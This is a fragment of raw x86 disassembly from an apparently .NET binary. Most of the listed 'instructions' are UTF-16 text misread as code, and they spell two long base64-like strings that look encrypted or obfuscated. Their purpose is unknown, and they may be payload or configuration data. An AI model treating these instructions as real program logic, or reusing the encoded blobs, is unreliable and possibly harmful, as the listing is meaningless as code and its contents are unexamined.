  40ae15:	00 4e 00             	add    %cl,0x0(%esi)
  40ae18:	69 00 45 00 78 00    	imul   $0x780045,(%eax),%eax
  40ae1e:	76 00                	jbe    0x40ae20
  40ae20:	37                   	aaa
  40ae21:	00 65 00             	add    %ah,0x0(%ebp)
  40ae24:	76 00                	jbe    0x40ae26
  40ae26:	50                   	push   %eax
  40ae27:	00 2b                	add    %ch,(%ebx)
  40ae29:	00 6e 00             	add    %ch,0x0(%esi)
  40ae2c:	62 00                	bound  %eax,(%eax)
  40ae2e:	4a                   	dec    %edx
  40ae2f:	00 39                	add    %bh,(%ecx)
  40ae31:	00 57 00             	add    %dl,0x0(%edi)
  40ae34:	38 00                	cmp    %al,(%eax)
  40ae36:	32 00                	xor    (%eax),%al
  40ae38:	43                   	inc    %ebx
  40ae39:	00 39                	add    %bh,(%ecx)
  40ae3b:	00 5a 00             	add    %bl,0x0(%edx)
  40ae3e:	38 00                	cmp    %al,(%eax)
  40ae40:	66 00 74 00 70       	data16 add %dh,0x70(%eax,%eax,1)
  40ae45:	00 61 00             	add    %ah,0x0(%ecx)
  40ae48:	4b                   	dec    %ebx
  40ae49:	00 50 00             	add    %dl,0x0(%eax)
  40ae4c:	74 00                	je     0x40ae4e
  40ae4e:	43                   	inc    %ebx
  40ae4f:	00 52 00             	add    %dl,0x0(%edx)
  40ae52:	32 00                	xor    (%eax),%al
  40ae54:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae55:	00 65 00             	add    %ah,0x0(%ebp)
  40ae58:	63 00                	arpl   %eax,(%eax)
  40ae5a:	69 00 4e 00 64 00    	imul   $0x64004e,(%eax),%eax
  40ae60:	44                   	inc    %esp
  40ae61:	00 46 00             	add    %al,0x0(%esi)
  40ae64:	57                   	push   %edi
  40ae65:	00 61 00             	add    %ah,0x0(%ecx)
  40ae68:	49                   	dec    %ecx
  40ae69:	00 61 00             	add    %ah,0x0(%ecx)
  40ae6c:	37                   	aaa
  40ae6d:	00 62 00             	add    %ah,0x0(%edx)
  40ae70:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40ae74:	68 00 38 00 72       	push   $0x72003800
  40ae79:	00 62 00             	add    %ah,0x0(%edx)
  40ae7c:	44                   	inc    %esp
  40ae7d:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae80:	69 00 61 00 6e 00    	imul   $0x6e0061,(%eax),%eax
  40ae86:	48                   	dec    %eax
  40ae87:	00 6e 00             	add    %ch,0x0(%esi)
  40ae8a:	4c                   	dec    %esp
  40ae8b:	00 65 00             	add    %ah,0x0(%ebp)
  40ae8e:	37                   	aaa
  40ae8f:	00 58 00             	add    %bl,0x0(%eax)
  40ae92:	38 00                	cmp    %al,(%eax)
  40ae94:	42                   	inc    %edx
  40ae95:	00 4f 00             	add    %cl,0x0(%edi)
  40ae98:	33 00                	xor    (%eax),%eax
  40ae9a:	59                   	pop    %ecx
  40ae9b:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40ae9f:	00 4a 00             	add    %cl,0x0(%edx)
  40aea2:	68 00 42 00 51       	push   $0x51004200
  40aea7:	00 30                	add    %dh,(%eax)
  40aea9:	00 52 00             	add    %dl,0x0(%edx)
  40aeac:	70 00                	jo     0x40aeae
  40aeae:	5a                   	pop    %edx
  40aeaf:	00 63 00             	add    %ah,0x0(%ebx)
  40aeb2:	37                   	aaa
  40aeb3:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40aeb7:	00 6e 00             	add    %ch,0x0(%esi)
  40aeba:	33 00                	xor    (%eax),%eax
  40aebc:	33 00                	xor    (%eax),%eax
  40aebe:	74 00                	je     0x40aec0
  40aec0:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40aec4:	2b 00                	sub    (%eax),%eax
  40aec6:	51                   	push   %ecx
  40aec7:	00 75 00             	add    %dh,0x0(%ebp)
  40aeca:	41                   	inc    %ecx
  40aecb:	00 79 00             	add    %bh,0x0(%ecx)
  40aece:	2f                   	das
  40aecf:	00 7a 00             	add    %bh,0x0(%edx)
  40aed2:	42                   	inc    %edx
  40aed3:	00 7a 00             	add    %bh,0x0(%edx)
  40aed6:	53                   	push   %ebx
  40aed7:	00 7a 00             	add    %bh,0x0(%edx)
  40aeda:	77 00                	ja     0x40aedc
  40aedc:	2f                   	das
  40aedd:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40aee1:	00 4d 00             	add    %cl,0x0(%ebp)
  40aee4:	78 00                	js     0x40aee6
  40aee6:	73 00                	jae    0x40aee8
  40aee8:	4e                   	dec    %esi
  40aee9:	00 46 00             	add    %al,0x0(%esi)
  40aeec:	75 00                	jne    0x40aeee
  40aeee:	55                   	push   %ebp
  40aeef:	00 30                	add    %dh,(%eax)
  40aef1:	00 71 00             	add    %dh,0x0(%ecx)
  40aef4:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40aef8:	62 00                	bound  %eax,(%eax)
  40aefa:	52                   	push   %edx
  40aefb:	00 63 00             	add    %ah,0x0(%ebx)
  40aefe:	77 00                	ja     0x40af00
  40af00:	67 00 6c 00          	add    %ch,0x0(%si)
  40af04:	2f                   	das
  40af05:	00 36                	add    %dh,(%esi)
  40af07:	00 59 00             	add    %bl,0x0(%ecx)
  40af0a:	32 00                	xor    (%eax),%al
  40af0c:	62 00                	bound  %eax,(%eax)
  40af0e:	49                   	dec    %ecx
  40af0f:	00 71 00             	add    %dh,0x0(%ecx)
  40af12:	63 00                	arpl   %eax,(%eax)
  40af14:	50                   	push   %eax
  40af15:	00 78 00             	add    %bh,0x0(%eax)
  40af18:	4a                   	dec    %edx
  40af19:	00 75 00             	add    %dh,0x0(%ebp)
  40af1c:	69 00 6f 00 4f 00    	imul   $0x4f006f,(%eax),%eax
  40af22:	70 00                	jo     0x40af24
  40af24:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40af28:	39 00                	cmp    %eax,(%eax)
  40af2a:	36 00 6c 00 33       	add    %ch,%ss:0x33(%eax,%eax,1)
  40af2f:	00 38                	add    %bh,(%eax)
  40af31:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40af35:	00 65 00             	add    %ah,0x0(%ebp)
  40af38:	2b 00                	sub    (%eax),%eax
  40af3a:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40af3e:	36 00 30             	add    %dh,%ss:(%eax)
  40af41:	00 6d 00             	add    %ch,0x0(%ebp)
  40af44:	54                   	push   %esp
  40af45:	00 57 00             	add    %dl,0x0(%edi)
  40af48:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40af4c:	32 00                	xor    (%eax),%al
  40af4e:	78 00                	js     0x40af50
  40af50:	62 00                	bound  %eax,(%eax)
  40af52:	31 00                	xor    %eax,(%eax)
  40af54:	4f                   	dec    %edi
  40af55:	00 4f 00             	add    %cl,0x0(%edi)
  40af58:	38 00                	cmp    %al,(%eax)
  40af5a:	42                   	inc    %edx
  40af5b:	00 49 00             	add    %cl,0x0(%ecx)
  40af5e:	58                   	pop    %eax
  40af5f:	00 45 00             	add    %al,0x0(%ebp)
  40af62:	37                   	aaa
  40af63:	00 65 00             	add    %ah,0x0(%ebp)
  40af66:	48                   	dec    %eax
  40af67:	00 39                	add    %bh,(%ecx)
  40af69:	00 30                	add    %dh,(%eax)
  40af6b:	00 47 00             	add    %al,0x0(%edi)
  40af6e:	77 00                	ja     0x40af70
  40af70:	58                   	pop    %eax
  40af71:	00 45 00             	add    %al,0x0(%ebp)
  40af74:	37                   	aaa
  40af75:	00 43 00             	add    %al,0x0(%ebx)
  40af78:	4b                   	dec    %ebx
  40af79:	00 70 00             	add    %dh,0x0(%eax)
  40af7c:	63 00                	arpl   %eax,(%eax)
  40af7e:	51                   	push   %ecx
  40af7f:	00 37                	add    %dh,(%edi)
  40af81:	00 39                	add    %bh,(%ecx)
  40af83:	00 63 00             	add    %ah,0x0(%ebx)
  40af86:	31 00                	xor    %eax,(%eax)
  40af88:	5a                   	pop    %edx
  40af89:	00 59 00             	add    %bl,0x0(%ecx)
  40af8c:	42                   	inc    %edx
  40af8d:	00 77 00             	add    %dh,0x0(%edi)
  40af90:	46                   	inc    %esi
  40af91:	00 2f                	add    %ch,(%edi)
  40af93:	00 53 00             	add    %dl,0x0(%ebx)
  40af96:	31 00                	xor    %eax,(%eax)
  40af98:	44                   	inc    %esp
  40af99:	00 71 00             	add    %dh,0x0(%ecx)
  40af9c:	69 00 43 00 76 00    	imul   $0x760043,(%eax),%eax
  40afa2:	38 00                	cmp    %al,(%eax)
  40afa4:	56                   	push   %esi
  40afa5:	00 6f 00             	add    %ch,0x0(%edi)
  40afa8:	31 00                	xor    %eax,(%eax)
  40afaa:	7a 00                	jp     0x40afac
  40afac:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40afb0:	49                   	dec    %ecx
  40afb1:	00 43 00             	add    %al,0x0(%ebx)
  40afb4:	54                   	push   %esp
  40afb5:	00 67 00             	add    %ah,0x0(%edi)
  40afb8:	48                   	dec    %eax
  40afb9:	00 41 00             	add    %al,0x0(%ecx)
  40afbc:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40afc0:	49                   	dec    %ecx
  40afc1:	00 30                	add    %dh,(%eax)
  40afc3:	00 6f 00             	add    %ch,0x0(%edi)
  40afc6:	47                   	inc    %edi
  40afc7:	00 46 00             	add    %al,0x0(%esi)
  40afca:	4b                   	dec    %ebx
  40afcb:	00 38                	add    %bh,(%eax)
  40afcd:	00 2b                	add    %ch,(%ebx)
  40afcf:	00 35 00 6a 00 2f    	add    %dh,0x2f006a00
  40afd5:	00 73 00             	add    %dh,0x0(%ebx)
  40afd8:	54                   	push   %esp
  40afd9:	00 4f 00             	add    %cl,0x0(%edi)
  40afdc:	74 00                	je     0x40afde
  40afde:	47                   	inc    %edi
  40afdf:	00 47 00             	add    %al,0x0(%edi)
  40afe2:	71 00                	jno    0x40afe4
  40afe4:	31 00                	xor    %eax,(%eax)
  40afe6:	52                   	push   %edx
  40afe7:	00 51 00             	add    %dl,0x0(%ecx)
  40afea:	52                   	push   %edx
  40afeb:	00 78 00             	add    %bh,0x0(%eax)
  40afee:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40aff2:	75 00                	jne    0x40aff4
  40aff4:	41                   	inc    %ecx
  40aff5:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40aff9:	00 79 00             	add    %bh,0x0(%ecx)
  40affc:	59                   	pop    %ecx
  40affd:	00 6b 00             	add    %ch,0x0(%ebx)
  40b000:	39 00                	cmp    %eax,(%eax)
  40b002:	6e                   	outsb  %ds:(%esi),(%dx)
  40b003:	00 32                	add    %dh,(%edx)
  40b005:	00 49 00             	add    %cl,0x0(%ecx)
  40b008:	4c                   	dec    %esp
  40b009:	00 63 00             	add    %ah,0x0(%ebx)
  40b00c:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40b010:	78 00                	js     0x40b012
  40b012:	31 00                	xor    %eax,(%eax)
  40b014:	72 00                	jb     0x40b016
  40b016:	2b 00                	sub    (%eax),%eax
  40b018:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40b01c:	4d                   	dec    %ebp
  40b01d:	00 42 00             	add    %al,0x0(%edx)
  40b020:	79 00                	jns    0x40b022
  40b022:	2f                   	das
  40b023:	00 71 00             	add    %dh,0x0(%ecx)
  40b026:	51                   	push   %ecx
  40b027:	00 75 00             	add    %dh,0x0(%ebp)
  40b02a:	35 00 43 00 33       	xor    $0x33004300,%eax
  40b02f:	00 6a 00             	add    %ch,0x0(%edx)
  40b032:	31 00                	xor    %eax,(%eax)
  40b034:	4d                   	dec    %ebp
  40b035:	00 68 00             	add    %ch,0x0(%eax)
  40b038:	4b                   	dec    %ebx
  40b039:	00 32                	add    %dh,(%edx)
  40b03b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b03e:	6d                   	insl   (%dx),%es:(%edi)
  40b03f:	00 6b 00             	add    %ch,0x0(%ebx)
  40b042:	77 00                	ja     0x40b044
  40b044:	55                   	push   %ebp
  40b045:	00 4d 00             	add    %cl,0x0(%ebp)
  40b048:	2b 00                	sub    (%eax),%eax
  40b04a:	51                   	push   %ecx
  40b04b:	00 51 00             	add    %dl,0x0(%ecx)
  40b04e:	34 00                	xor    $0x0,%al
  40b050:	4a                   	dec    %edx
  40b051:	00 31                	add    %dh,(%ecx)
  40b053:	00 2f                	add    %ch,(%edi)
  40b055:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b058:	56                   	push   %esi
  40b059:	00 41 00             	add    %al,0x0(%ecx)
  40b05c:	66 00 32             	data16 add %dh,(%edx)
  40b05f:	00 62 00             	add    %ah,0x0(%edx)
  40b062:	62 00                	bound  %eax,(%eax)
  40b064:	68 00 78 00 4c       	push   $0x4c007800
  40b069:	00 4e 00             	add    %cl,0x0(%esi)
  40b06c:	67 00 57 00          	add    %dl,0x0(%bx)
  40b070:	6b 00 51             	imul   $0x51,(%eax),%eax
  40b073:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  40b077:	00 36                	add    %dh,(%esi)
  40b079:	00 78 00             	add    %bh,0x0(%eax)
  40b07c:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40b080:	35 00 6f 00 67       	xor    $0x67006f00,%eax
  40b085:	00 49 00             	add    %cl,0x0(%ecx)
  40b088:	6a 00                	push   $0x0
  40b08a:	35 00 61 00 42       	xor    $0x42006100,%eax
  40b08f:	00 6a 00             	add    %ch,0x0(%edx)
  40b092:	4e                   	dec    %esi
  40b093:	00 79 00             	add    %bh,0x0(%ecx)
  40b096:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40b09a:	33 00                	xor    (%eax),%eax
  40b09c:	57                   	push   %edi
  40b09d:	00 35 00 4e 00 4a    	add    %dh,0x4a004e00
  40b0a3:	00 78 00             	add    %bh,0x0(%eax)
  40b0a6:	67 00 32             	add    %dh,(%bp,%si)
  40b0a9:	00 46 00             	add    %al,0x0(%esi)
  40b0ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0ad:	00 66 00             	add    %ah,0x0(%esi)
  40b0b0:	4a                   	dec    %edx
  40b0b1:	00 32                	add    %dh,(%edx)
  40b0b3:	00 58 00             	add    %bl,0x0(%eax)
  40b0b6:	66 00 76 00          	data16 add %dh,0x0(%esi)
  40b0ba:	73 00                	jae    0x40b0bc
  40b0bc:	49                   	dec    %ecx
  40b0bd:	00 71 00             	add    %dh,0x0(%ecx)
  40b0c0:	62 00                	bound  %eax,(%eax)
  40b0c2:	39 00                	cmp    %eax,(%eax)
  40b0c4:	63 00                	arpl   %eax,(%eax)
  40b0c6:	42                   	inc    %edx
  40b0c7:	00 39                	add    %bh,(%ecx)
  40b0c9:	00 69 00             	add    %ch,0x0(%ecx)
  40b0cc:	6c                   	insb   (%dx),%es:(%edi)
  40b0cd:	00 36                	add    %dh,(%esi)
  40b0cf:	00 48 00             	add    %cl,0x0(%eax)
  40b0d2:	34 00                	xor    $0x0,%al
  40b0d4:	2b 00                	sub    (%eax),%eax
  40b0d6:	76 00                	jbe    0x40b0d8
  40b0d8:	4f                   	dec    %edi
  40b0d9:	00 73 00             	add    %dh,0x0(%ebx)
  40b0dc:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40b0e0:	52                   	push   %edx
  40b0e1:	00 71 00             	add    %dh,0x0(%ecx)
  40b0e4:	39 00                	cmp    %eax,(%eax)
  40b0e6:	58                   	pop    %eax
  40b0e7:	00 6e 00             	add    %ch,0x0(%esi)
  40b0ea:	6a 00                	push   $0x0
  40b0ec:	69 00 2b 00 44 00    	imul   $0x44002b,(%eax),%eax
  40b0f2:	69 00 6f 00 57 00    	imul   $0x57006f,(%eax),%eax
  40b0f8:	71 00                	jno    0x40b0fa
  40b0fa:	4b                   	dec    %ebx
  40b0fb:	00 6e 00             	add    %ch,0x0(%esi)
  40b0fe:	39 00                	cmp    %eax,(%eax)
  40b100:	4d                   	dec    %ebp
  40b101:	00 6f 00             	add    %ch,0x0(%edi)
  40b104:	6a 00                	push   $0x0
  40b106:	41                   	inc    %ecx
  40b107:	00 53 00             	add    %dl,0x0(%ebx)
  40b10a:	50                   	push   %eax
  40b10b:	00 48 00             	add    %cl,0x0(%eax)
  40b10e:	52                   	push   %edx
  40b10f:	00 43 00             	add    %al,0x0(%ebx)
  40b112:	57                   	push   %edi
  40b113:	00 36                	add    %dh,(%esi)
  40b115:	00 39                	add    %bh,(%ecx)
  40b117:	00 53 00             	add    %dl,0x0(%ebx)
  40b11a:	78 00                	js     0x40b11c
  40b11c:	63 00                	arpl   %eax,(%eax)
  40b11e:	30 00                	xor    %al,(%eax)
  40b120:	78 00                	js     0x40b122
  40b122:	50                   	push   %eax
  40b123:	00 35 00 4a 00 6a    	add    %dh,0x6a004a00
  40b129:	00 38                	add    %bh,(%eax)
  40b12b:	00 65 00             	add    %ah,0x0(%ebp)
  40b12e:	43                   	inc    %ebx
  40b12f:	00 79 00             	add    %bh,0x0(%ecx)
  40b132:	31 00                	xor    %eax,(%eax)
  40b134:	56                   	push   %esi
  40b135:	00 50 00             	add    %dl,0x0(%eax)
  40b138:	39 00                	cmp    %eax,(%eax)
  40b13a:	30 00                	xor    %al,(%eax)
  40b13c:	37                   	aaa
  40b13d:	00 47 00             	add    %al,0x0(%edi)
  40b140:	44                   	inc    %esp
  40b141:	00 2f                	add    %ch,(%edi)
  40b143:	00 46 00             	add    %al,0x0(%esi)
  40b146:	41                   	inc    %ecx
  40b147:	00 75 00             	add    %dh,0x0(%ebp)
  40b14a:	42                   	inc    %edx
  40b14b:	00 75 00             	add    %dh,0x0(%ebp)
  40b14e:	34 00                	xor    $0x0,%al
  40b150:	70 00                	jo     0x40b152
  40b152:	35 00 59 00 50       	xor    $0x50005900,%eax
  40b157:	00 6d 00             	add    %ch,0x0(%ebp)
  40b15a:	56                   	push   %esi
  40b15b:	00 69 00             	add    %ch,0x0(%ecx)
  40b15e:	67 00 57 00          	add    %dl,0x0(%bx)
  40b162:	31 00                	xor    %eax,(%eax)
  40b164:	50                   	push   %eax
  40b165:	00 53 00             	add    %dl,0x0(%ebx)
  40b168:	31 00                	xor    %eax,(%eax)
  40b16a:	50                   	push   %eax
  40b16b:	00 2b                	add    %ch,(%ebx)
  40b16d:	00 42 00             	add    %al,0x0(%edx)
  40b170:	45                   	inc    %ebp
  40b171:	00 43 00             	add    %al,0x0(%ebx)
  40b174:	63 00                	arpl   %eax,(%eax)
  40b176:	72 00                	jb     0x40b178
  40b178:	34 00                	xor    $0x0,%al
  40b17a:	4e                   	dec    %esi
  40b17b:	00 78 00             	add    %bh,0x0(%eax)
  40b17e:	74 00                	je     0x40b180
  40b180:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40b184:	4c                   	dec    %esp
  40b185:	00 61 00             	add    %ah,0x0(%ecx)
  40b188:	4a                   	dec    %edx
  40b189:	00 70 00             	add    %dh,0x0(%eax)
  40b18c:	61                   	popa
  40b18d:	00 72 00             	add    %dh,0x0(%edx)
  40b190:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40b194:	30 00                	xor    %al,(%eax)
  40b196:	52                   	push   %edx
  40b197:	00 56 00             	add    %dl,0x0(%esi)
  40b19a:	32 00                	xor    (%eax),%al
  40b19c:	46                   	inc    %esi
  40b19d:	00 62 00             	add    %ah,0x0(%edx)
  40b1a0:	47                   	inc    %edi
  40b1a1:	00 36                	add    %dh,(%esi)
  40b1a3:	00 57 00             	add    %dl,0x0(%edi)
  40b1a6:	35 00 6e 00 30       	xor    $0x30006e00,%eax
  40b1ab:	00 78 00             	add    %bh,0x0(%eax)
  40b1ae:	6c                   	insb   (%dx),%es:(%edi)
  40b1af:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40b1b3:	00 49 00             	add    %cl,0x0(%ecx)
  40b1b6:	38 00                	cmp    %al,(%eax)
  40b1b8:	78 00                	js     0x40b1ba
  40b1ba:	4a                   	dec    %edx
  40b1bb:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  40b1bf:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1c2:	37                   	aaa
  40b1c3:	00 5a 00             	add    %bl,0x0(%edx)
  40b1c6:	30 00                	xor    %al,(%eax)
  40b1c8:	44                   	inc    %esp
  40b1c9:	00 78 00             	add    %bh,0x0(%eax)
  40b1cc:	51                   	push   %ecx
  40b1cd:	00 30                	add    %dh,(%eax)
  40b1cf:	00 75 00             	add    %dh,0x0(%ebp)
  40b1d2:	37                   	aaa
  40b1d3:	00 78 00             	add    %bh,0x0(%eax)
  40b1d6:	33 00                	xor    (%eax),%eax
  40b1d8:	71 00                	jno    0x40b1da
  40b1da:	33 00                	xor    (%eax),%eax
  40b1dc:	63 00                	arpl   %eax,(%eax)
  40b1de:	2f                   	das
  40b1df:	00 51 00             	add    %dl,0x0(%ecx)
  40b1e2:	76 00                	jbe    0x40b1e4
  40b1e4:	33 00                	xor    (%eax),%eax
  40b1e6:	31 00                	xor    %eax,(%eax)
  40b1e8:	4f                   	dec    %edi
  40b1e9:	00 61 00             	add    %ah,0x0(%ecx)
  40b1ec:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40b1f0:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b1f4:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40b1f8:	78 00                	js     0x40b1fa
  40b1fa:	6c                   	insb   (%dx),%es:(%edi)
  40b1fb:	00 67 00             	add    %ah,0x0(%edi)
  40b1fe:	45                   	inc    %ebp
  40b1ff:	00 68 00             	add    %ch,0x0(%eax)
  40b202:	33 00                	xor    (%eax),%eax
  40b204:	6d                   	insl   (%dx),%es:(%edi)
  40b205:	00 78 00             	add    %bh,0x0(%eax)
  40b208:	64 00 31             	add    %dh,%fs:(%ecx)
  40b20b:	00 66 00             	add    %ah,0x0(%esi)
  40b20e:	59                   	pop    %ecx
  40b20f:	00 47 00             	add    %al,0x0(%edi)
  40b212:	6a 00                	push   $0x0
  40b214:	65 00 2f             	add    %ch,%gs:(%edi)
  40b217:	00 57 00             	add    %dl,0x0(%edi)
  40b21a:	4c                   	dec    %esp
  40b21b:	00 77 00             	add    %dh,0x0(%edi)
  40b21e:	53                   	push   %ebx
  40b21f:	00 47 00             	add    %al,0x0(%edi)
  40b222:	72 00                	jb     0x40b224
  40b224:	69 00 34 00 73 00    	imul   $0x730034,(%eax),%eax
  40b22a:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40b22f:	44                   	inc    %esp
  40b230:	00 65 00             	add    %ah,0x0(%ebp)
  40b233:	74 00                	je     0x40b235
  40b235:	7a 00                	jp     0x40b237
  40b237:	76 00                	jbe    0x40b239
  40b239:	56                   	push   %esi
  40b23a:	00 57 00             	add    %dl,0x0(%edi)
  40b23d:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40b241:	52                   	push   %edx
  40b242:	00 63 00             	add    %ah,0x0(%ebx)
  40b245:	4f                   	dec    %edi
  40b246:	00 41 00             	add    %al,0x0(%ecx)
  40b249:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40b24d:	31 00                	xor    %eax,(%eax)
  40b24f:	44                   	inc    %esp
  40b250:	00 76 00             	add    %dh,0x0(%esi)
  40b253:	4a                   	dec    %edx
  40b254:	00 65 00             	add    %ah,0x0(%ebp)
  40b257:	71 00                	jno    0x40b259
  40b259:	54                   	push   %esp
  40b25a:	00 6e 00             	add    %ch,0x0(%esi)
  40b25d:	57                   	push   %edi
  40b25e:	00 37                	add    %dh,(%edi)
  40b260:	00 2b                	add    %ch,(%ebx)
  40b262:	00 4e 00             	add    %cl,0x0(%esi)
  40b265:	5a                   	pop    %edx
  40b266:	00 47 00             	add    %al,0x0(%edi)
  40b269:	4a                   	dec    %edx
  40b26a:	00 39                	add    %bh,(%ecx)
  40b26c:	00 76 00             	add    %dh,0x0(%esi)
  40b26f:	39 00                	cmp    %eax,(%eax)
  40b271:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b275:	6e                   	outsb  %ds:(%esi),(%dx)
  40b276:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40b27a:	00 68 00             	add    %ch,0x0(%eax)
  40b27d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b27e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b281:	73 00                	jae    0x40b283
  40b283:	71 00                	jno    0x40b285
  40b285:	5a                   	pop    %edx
  40b286:	00 77 00             	add    %dh,0x0(%edi)
  40b289:	58                   	pop    %eax
  40b28a:	00 41 00             	add    %al,0x0(%ecx)
  40b28d:	35 00 76 00 77       	xor    $0x77007600,%eax
  40b292:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40b296:	00 68 00             	add    %ch,0x0(%eax)
  40b299:	6a 00                	push   $0x0
  40b29b:	56                   	push   %esi
  40b29c:	00 5a 00             	add    %bl,0x0(%edx)
  40b29f:	69 00 69 00 2b 00    	imul   $0x2b0069,(%eax),%eax
  40b2a5:	59                   	pop    %ecx
  40b2a6:	00 6a 00             	add    %ch,0x0(%edx)
  40b2a9:	30 00                	xor    %al,(%eax)
  40b2ab:	32 00                	xor    (%eax),%al
  40b2ad:	37                   	aaa
  40b2ae:	00 39                	add    %bh,(%ecx)
  40b2b0:	00 4a 00             	add    %cl,0x0(%edx)
  40b2b3:	7a 00                	jp     0x40b2b5
  40b2b5:	39 00                	cmp    %eax,(%eax)
  40b2b7:	49                   	dec    %ecx
  40b2b8:	00 39                	add    %bh,(%ecx)
  40b2ba:	00 53 00             	add    %dl,0x0(%ebx)
  40b2bd:	6a 00                	push   $0x0
  40b2bf:	5a                   	pop    %edx
  40b2c0:	00 56 00             	add    %dl,0x0(%esi)
  40b2c3:	4c                   	dec    %esp
  40b2c4:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2c7:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40b2cb:	55                   	push   %ebp
  40b2cc:	00 65 00             	add    %ah,0x0(%ebp)
  40b2cf:	54                   	push   %esp
  40b2d0:	00 72 00             	add    %dh,0x0(%edx)
  40b2d3:	79 00                	jns    0x40b2d5
  40b2d5:	68 00 49 00 76       	push   $0x76004900
  40b2da:	00 42 00             	add    %al,0x0(%edx)
  40b2dd:	6c                   	insb   (%dx),%es:(%edi)
  40b2de:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40b2e2:	00 77 00             	add    %dh,0x0(%edi)
  40b2e5:	61                   	popa
  40b2e6:	00 37                	add    %dh,(%edi)
  40b2e8:	00 49 00             	add    %cl,0x0(%ecx)
  40b2eb:	69 00 35 00 55 00    	imul   $0x550035,(%eax),%eax
  40b2f1:	71 00                	jno    0x40b2f3
  40b2f3:	4c                   	dec    %esp
  40b2f4:	00 69 00             	add    %ch,0x0(%ecx)
  40b2f7:	32 00                	xor    (%eax),%al
  40b2f9:	41                   	inc    %ecx
  40b2fa:	00 65 00             	add    %ah,0x0(%ebp)
  40b2fd:	69 00 6d 00 45 00    	imul   $0x45006d,(%eax),%eax
  40b303:	55                   	push   %ebp
  40b304:	00 53 00             	add    %dl,0x0(%ebx)
  40b307:	48                   	dec    %eax
  40b308:	00 41 00             	add    %al,0x0(%ecx)
  40b30b:	32 00                	xor    (%eax),%al
  40b30d:	4f                   	dec    %edi
  40b30e:	00 72 00             	add    %dh,0x0(%edx)
  40b311:	45                   	inc    %ebp
  40b312:	00 31                	add    %dh,(%ecx)
  40b314:	00 51 00             	add    %dl,0x0(%ecx)
  40b317:	59                   	pop    %ecx
  40b318:	00 43 00             	add    %al,0x0(%ebx)
  40b31b:	47                   	inc    %edi
  40b31c:	00 41 00             	add    %al,0x0(%ecx)
  40b31f:	65 00 4c 00 7a       	add    %cl,%gs:0x7a(%eax,%eax,1)
  40b324:	00 2f                	add    %ch,(%edi)
  40b326:	00 75 00             	add    %dh,0x0(%ebp)
  40b329:	59                   	pop    %ecx
  40b32a:	00 32                	add    %dh,(%edx)
  40b32c:	00 48 00             	add    %cl,0x0(%eax)
  40b32f:	6a 00                	push   $0x0
  40b331:	49                   	dec    %ecx
  40b332:	00 79 00             	add    %bh,0x0(%ecx)
  40b335:	48                   	dec    %eax
  40b336:	00 36                	add    %dh,(%esi)
  40b338:	00 48 00             	add    %cl,0x0(%eax)
  40b33b:	39 00                	cmp    %eax,(%eax)
  40b33d:	46                   	inc    %esi
  40b33e:	00 48 00             	add    %cl,0x0(%eax)
  40b341:	67 00 66 00          	add    %ah,0x0(%bp)
  40b345:	67 00 6e 00          	add    %ch,0x0(%bp)
  40b349:	4a                   	dec    %edx
  40b34a:	00 73 00             	add    %dh,0x0(%ebx)
  40b34d:	68 00 7a 00 6b       	push   $0x6b007a00
  40b352:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40b356:	00 76 00             	add    %dh,0x0(%esi)
  40b359:	2b 00                	sub    (%eax),%eax
  40b35b:	54                   	push   %esp
  40b35c:	00 59 00             	add    %bl,0x0(%ecx)
  40b35f:	46                   	inc    %esi
  40b360:	00 72 00             	add    %dh,0x0(%edx)
  40b363:	4e                   	dec    %esi
  40b364:	00 52 00             	add    %dl,0x0(%edx)
  40b367:	59                   	pop    %ecx
  40b368:	00 7a 00             	add    %bh,0x0(%edx)
  40b36b:	43                   	inc    %ebx
  40b36c:	00 61 00             	add    %ah,0x0(%ecx)
  40b36f:	74 00                	je     0x40b371
  40b371:	6d                   	insl   (%dx),%es:(%edi)
  40b372:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  40b376:	00 65 00             	add    %ah,0x0(%ebp)
  40b379:	74 00                	je     0x40b37b
  40b37b:	62 00                	bound  %eax,(%eax)
  40b37d:	48                   	dec    %eax
